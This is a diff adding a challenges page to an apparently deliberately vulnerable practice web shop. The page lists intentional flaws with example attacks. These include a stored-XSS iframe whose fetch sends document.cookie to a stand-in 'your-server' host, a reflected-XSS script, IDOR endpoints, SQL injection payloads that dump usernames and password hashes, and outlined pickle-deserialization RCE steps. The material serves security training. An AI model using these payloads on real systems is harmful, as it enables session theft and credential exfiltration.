@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change Password - FishingStore</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .profile-container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .profile-section {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 600px;
+        }
+
+        .profile-section h2 {
+            text-align: center;
+            margin: 0 0 20px 0;
+            color: #333;
+            font-size: 1.5em;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #eee;
+        }
+
+        .profile-section h2 i {
+            margin-right: 10px;
+            color: #4CAF50;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1em;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus {
+            border-color: #4CAF50;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(76, 175, 80, 0.1);
+        }
+
+        .btn-save {
+            display: block;
+            width: 100%;
+            max-width: 200px;
+            margin: 30px auto 0;
+            padding: 12px 24px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: all 0.2s;
+        }
+
+        .btn-save:hover {
+            background-color: #45a049;
+            transform: translateY(-2px);
+        }
+
+        .alert {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto 20px;
+            padding: 12px;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .alert-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="/" class="nav-brand">FishingStore</a>
+            <div class="nav-menu">
+                <a href="/cart.html" class="cart-icon" id="cartIcon">
+                    <i class="fas fa-shopping-cart"></i>
+                    <span class="cart-count">0</span>
+                </a>
+                <a href="/challenge.html" class="cart-icon">
+                    <i class="fas fa-flag"></i>
+                </a>
+                <div class="user-menu">
+                    <button class="user-menu-btn" id="userMenuBtn">
+                        <i class="fas fa-user"></i>
+                        <span>Account</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </button>
+                    <div class="user-menu-content" id="userMenuContent">
+                        <a href="/profile.html" class="user-menu-item">
+                            <i class="fas fa-user-circle"></i>My Address
+                        </a>
+                        <a href="/orders.html" class="user-menu-item">
+                            <i class="fas fa-box"></i>Orders
+                        </a>
+                        <a href="/change-password.html" class="user-menu-item">
+                            <i class="fas fa-key"></i>Change Password
+                        </a>
+                        <hr style="margin: 8px 0; border: none; border-top: 1px solid #eee;">
+                        <a href="#" class="user-menu-item" id="logoutButton">
+                            <i class="fas fa-sign-out-alt"></i>Logout
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="profile-container auth-only">
+        <div class="profile-section">
+            <h2><i class="fas fa-flag"></i> Challenges</h2>
+<!-- Substitua dentro de .profile-section -->
+<p class="lead mb-4" style="text-align:center;">Explore as vulnerabilidades intencionais desta aplicação:</p>
+
+<ul style="list-style:none; padding:0; max-width:600px; margin:0 auto;">
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-code challenge-icon"></i> XSS Reflected <span class="challenge-badge difficulty-medium"></span></h3>
+        <p><b>Goal:</b> Exploit reflected XSS in http://your-server/index.html?affiliate=super-sports-tv.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>1. You must be unlogged in</li>
+            <li>2. Open the link in a new tab http://your-server/index.html?affiliate=super-sports-tv.</li>
+        </ol>
+        <b>Example Payload:</b>
+        <div class="code-block">http://your-server/index.html?affiliate=super-sports-tv&lt;script&gt;alert(1)&lt;/script&gt;</div>
+    </li>
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-code challenge-icon"></i> XSS Stored <span class="challenge-badge difficulty-medium"></span></h3>
+        <p><b>Goal:</b> Exploit stored XSS in comments to steal other users' cookies.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>Create a comment with an XSS payload</li>
+            <li>Use an iframe to bypass restrictions</li>
+            <li>Capture cookies on your server</li>
+        </ol>
+        <b>Example Payload:</b>
+        <div class="code-block">&lt;iframe src="javascript:fetch('http://your-server/'+document.cookie)"&gt;&lt;/iframe&gt;</div>
+    </li>
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-user-secret challenge-icon"></i> IDOR in Addresses <span class="challenge-badge difficulty-medium"></span></h3>
+        <p><b>Goal:</b> Exploit IDOR to access and modify other users' addresses.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>Identify your user ID</li>
+            <li>Modify the ID in the request</li>
+            <li>Access/modify other users' data</li>
+        </ol>
+        <b>Vulnerable Endpoints:</b>
+        <div class="code-block">GET /api/user/{user_id}/address<br>PUT /api/user/{user_id}/address</div>
+    </li>
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-database challenge-icon"></i> SQL Injection in Search <span class="challenge-badge difficulty-easy"></span></h3>
+        <p><b>Goal:</b> Exploit SQL Injection vulnerability in the search endpoint to extract sensitive information.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>Use ORDER BY to discover the number of columns</li>
+            <li>Use UNION SELECT to map the columns</li>
+            <li>Extract information from the sqlite_master table</li>
+            <li>Extract user credentials</li>
+        </ol>
+        <b>Example Payload:</b>
+        <div class="code-block">'</div>
+        <div class="code-block">'--</div>
+        <div class="code-block">' ORDER BY 1----</div>
+        <div class="code-block">' ORDER BY 6--</div>
+        <div class="code-block">' ORDER BY 5--</div>
+        <div class="code-block">A' UNION SELECT 1,2,3,4,5--</div>
+        <div class="code-block">A' UNION SELECT name, sql, 3,4,5 FROM sqlite_master--</div>
+        <div class="code-block">A' UNION SELECT name, sql, 3,4,5 FROM sqlite_master WHERE type='table'--</div>
+        <div class="code-block">A' UNION SELECT 1, username, hashed_password,4,5 FROM users--</div>
+
+
+    </li>
+    <li style="background:#f8f9fa; border-radius:8px; margin-bottom:20px; padding:20px 24px; border:1px solid #eee;">
+        <h3 style="margin-top:0;"><i class="fas fa-terminal challenge-icon"></i> RCE via Pickle in Cart Backup <span class="challenge-badge difficulty-hard"></span></h3>
+        <p><b>Goal:</b> Exploit insecure deserialization vulnerability in cart backup to execute arbitrary code.</p>
+        <b>Steps:</b>
+        <ol>
+            <li>Create a malicious class implementing __reduce__</li>
+            <li>Serialize the class with pickle</li>
+            <li>Encode in base64</li>
+            <li>Send to the import endpoint</li>
+        </ol>
+        <b>Vulnerable Endpoints:</b>
+        <div class="code-block">GET /api/cart/export<br>POST /api/cart/import</div>
+        <b>Exploit Script:</b>
+        <div class="code-block">python3 exploit.py<br>1. Export current cart<br>2. Import malicious cart (with RCE)<br>3. Test basic RCE (whoami)</div>
+    </li>
+</ul>
+        </div>
+
+        
+
+          
